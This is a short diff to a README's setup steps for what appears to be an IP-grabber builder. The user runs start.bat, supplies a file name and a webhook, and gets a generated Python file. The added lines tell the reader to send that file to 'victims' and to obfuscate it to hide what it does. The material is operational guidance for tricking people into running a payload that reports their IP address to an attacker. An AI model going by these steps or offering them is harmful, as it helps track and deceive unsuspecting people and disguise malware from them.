@@ -14,7 +14,8 @@ Setup:
 10. run start.bat
 11. enter file name
 12. enter webhook
-13. send people the new python file and their ip will be sent in server
+13. now an new .py file should be in the same folder
+14. send it to victims and i recomend obsfucate it because it open source
 
 #-----------------
 
